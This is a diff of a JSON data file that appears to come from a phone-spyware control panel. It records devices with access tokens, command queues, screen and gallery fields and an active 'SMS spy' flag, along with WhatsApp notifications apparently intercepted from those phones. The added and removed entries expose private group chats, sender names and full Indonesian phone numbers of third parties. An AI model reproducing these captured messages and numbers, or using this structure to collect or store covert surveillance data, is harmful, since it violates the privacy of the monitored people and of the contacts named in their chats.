@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775045191324,
+    "lastSeen": 1775045195398,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13368 pesan): ~ cwekbenji",
+        "content": "Jenis pesan tidak diketahui",
+        "time": "01/04 20:06",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775045193556
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4011,14 +4019,6 @@
         "time": "01/04 19:57",
         "pkg": "com.whatsapp",
         "receivedAt": 1775044629636
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎All Buyer Pegasus-X ( No Update ) (246 pesan): ~ FIYY",
-        "content": "@⁨+62 815-4550-1483⁩  kapan bg selesai nya?",
-        "time": "01/04 19:57",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775044629472
       }
     ],
     "galleryPhotos": [],
@@ -4049,7 +4049,7 @@
     "deviceName": "HP-AIM-22BD",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "ee7716168abf03ae6470b12578967076",
-    "lastSeen": 1775045192862,
+    "lastSeen": 1775045195835,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:33:59.233Z",
@@ -4065,6 +4065,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13369 pesan): ~ Bot",
+        "content": "💟 Stiker",
+        "time": "01/04 20:06",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775045196980
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13368 pesan): ~ cwekbenji",
+        "content": "Jenis pesan tidak diketahui",
+        "time": "01/04 20:06",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775045193570
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -8048,22 +8064,6 @@
         "time": "01/04 19:57",
         "pkg": "com.whatsapp",
         "receivedAt": 1775044629622
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎🇫🇮GB OPTEST XEMETRIX ELITE🇫🇮 (49 pesan): ~ ?",
-        "content": "📷 gg @⁨+62 813-1935-3554⁩",
-        "time": "01/04 19:57",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775044629587
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎All Buyer Pegasus-X ( No Update ) (246 pesan): ~ FIYY",
-        "content": "@⁨+62 815-4550-1483⁩  kapan bg selesai nya?",
-        "time": "01/04 19:57",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775044629442
       }
     ],
     "galleryPhotos": [],
